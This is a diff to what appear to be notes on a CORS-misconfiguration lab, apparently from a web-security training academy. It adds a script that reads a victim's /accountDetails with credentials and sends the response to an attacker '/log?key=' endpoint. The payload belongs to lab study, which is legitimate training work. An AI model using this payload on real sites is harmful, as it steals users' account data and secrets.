@@ -31,3 +31,16 @@ An attacker might be able to gain access using the domain:
 ____
 The specification for the Origin header supports the value `null`
 
+```html
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a2b001b036b9a14821d6a3000c3008c.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
